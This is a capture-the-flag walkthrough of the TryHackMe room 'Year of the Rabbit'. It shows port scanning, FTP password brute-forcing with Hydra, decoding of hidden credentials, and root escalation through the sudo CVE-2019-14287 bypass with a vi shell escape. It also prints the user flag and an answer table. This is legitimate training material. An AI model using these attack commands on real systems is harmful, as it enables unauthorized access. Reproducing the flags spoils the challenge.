# TryHackMe: Year of the Rabbit

**Difficulty:** Easy  
**Platform:** TryHackMe  
**Category:** Web / Cryptography / Sudo PrivEsc  

---

## Overview & Attack Path
1. **Reconnaissance:** Port scanning with Nmap and web directory fuzzing with Gobuster.
2. **Web Discovery:** Finding a hidden PHP page in `styles.css` that disables redirects and reveals a hidden directory `/WExYY2Cv-qU`.
3. **Steganography & FTP:** Extracting hidden FTP credentials from `Hot_Babe.png` using `strings` and brute-forcing FTP with Hydra.
4. **Brainfuck Decoding:** Retrieving `Eli's_Creds.txt` from FTP and decoding Brainfuck to gain SSH access as user `eli`.
5. **Lateral Movement:** Finding Gwendoline's credentials in `/usr/games/s3cr3t` to capture the user flag.
6. **Privilege Escalation:** Exploiting the Sudo `sudo -u#-1` bypass vulnerability (CVE-2019-14287) on `/usr/bin/vi` to gain root access.

---

## Step 1: Reconnaissance (Nmap & Gobuster)

First, scan the machine to identify all open ports and running services:

```bash
nmap -p- --min-rate=10000 -T4 <TARGET_IP>
```

### Scan Results:
* **Port 21 (FTP):** `vsftpd`
* **Port 22 (SSH):** `OpenSSH`
* **Port 80 (HTTP):** `Apache`

![Nmap scan results](../images/5b0f3c27f7a95a848760899761af4c54.png)

---

## Step 2: Web Enumeration & Hidden Directories

Since port 80 is open, run Gobuster to discover hidden directories and files:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster results](../images/143eb5c15c4ca3b9e108a3bdbd90596f.png)

A directory named `/assets` is discovered containing `styles.css` and `RickRolled.mp4`. Inspecting `styles.css` reveals a hidden PHP endpoint:

![Path to PHP site found in styles.css](../images/ad1a1f5b50662ebe2a62d22f235626ee.png)

Visiting the PHP page displays a popup alert:

![Alert message](../images/e249ff6939ca4dc407d394ec77b5d71b.png)

To bypass the JavaScript redirect loop:
1. **Option 1:** Disable JavaScript in Firefox (`about:config` → `javascript.enabled` = `false`).
2. **Option 2:** Open Developer Tools (F12) → Debugger to inspect the script logic.

![Debugger analysis](../images/9b4ae3316aadb50c522841db14a4562e.png)

Alternatively, curl the endpoint directly to avoid redirects and uncover the hidden path `/WExYY2Cv-qU`:

![Hidden directory CURL results](../images/e812937fdff11bb77d57515d40f07dd9.png)

---

## Step 3: Steganography & FTP Brute-Forcing

Navigating to `/WExYY2Cv-qU` yields an image file named `Hot_Babe.png`:

![Hot_Babe.png](../images/af94a8ad849164fa1dae57df002fddaa.png)

Download the image and inspect it using the `strings` command:

```bash
strings Hot_Babe.png
```

![Strings on image](../images/67b5a1dc8d9d62d43e8743353770e631.png)

The output reveals an FTP username **`ftpuser`** alongside a custom wordlist. Save the extracted words to `password.txt` and brute-force the FTP login with Hydra:

```bash
hydra -l ftpuser -P password.txt ftp://<TARGET_IP>
```

![Hydra FTP password crack](../images/e89881766225ab5696c656348fc62209.png)

Connect to the FTP service with the cracked credentials:

![FTP connection](../images/2096121a36d43ed19bf651e72016f841.png)

Download the file `Eli's_Creds.txt`:

```text
ftp> get Eli's_Creds.txt
ftp> exit
```

---

## Step 4: Brainfuck Decoding & SSH Foothold

Inspect the contents of `Eli's_Creds.txt`:

```text
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->- 
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ 
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+ 
++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++< 
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+ 
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->--- 
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++ 
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+ 
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++ 
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++ 
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

This text is encoded in **Brainfuck**. Decoding it reveals the SSH password for user `eli`.

![BrainFuck decoding](../images/16dbfa77d9ac58adaba3977e716abcf2.png)

Log in via SSH:

```bash
ssh eli@<TARGET_IP>
```

![SSH login](../images/16b58d417c4111482d6c5e03f9832345.png)

---

## Step 5: Lateral Movement to Gwendoline & User Flag

Upon logging in, a message notes:  
`"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"`

Search the filesystem for the secret directory:

```bash
find / -type d -name "*s3cr3t*" 2>/dev/null
```

![Finding secret directory](../images/8f9732ed0b0dc10900f7deec9191c0f3.png)

The directory `/usr/games/s3cr3t` contains a note with Gwendoline's password. Switch to `gwendoline` and read the user flag:

```bash
su gwendoline
cat /home/gwendoline/user.txt
```

> **User Flag:** `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

---

## Step 6: Privilege Escalation (Sudo CVE-2019-14287) & Root Flag

Check sudo permissions for user `gwendoline`:

```bash
sudo -l
```

![Checking sudo privileges](../images/68f19768a7a9b22e4c2c83ca5a244ccf.png)

The configuration permits running `/usr/bin/vi /home/gwendoline/user.txt` as any user *except* root (`(ALL, !root)`). This can be bypassed using the known Sudo UID `-1` flaw (**CVE-2019-14287**):

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Once inside `vi`, drop into a root shell by executing:
```text
:!/bin/sh
```

Retrieve the root flag from `/root/root.txt`:

![Final flag after privilege escalation](../images/9e3c1ec3fe907ba8789595e03f1d0a89.png)

---

## Summary of Answers

| Task / Question | Answer / Value |
| :--- | :--- |
| **FTP Username** | `ftpuser` |
| **SSH User** | `eli` |
| **User Pivot** | `gwendoline` |
| **User Flag** | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| **Root Exploit** | `CVE-2019-14287 (sudo -u#-1)` |
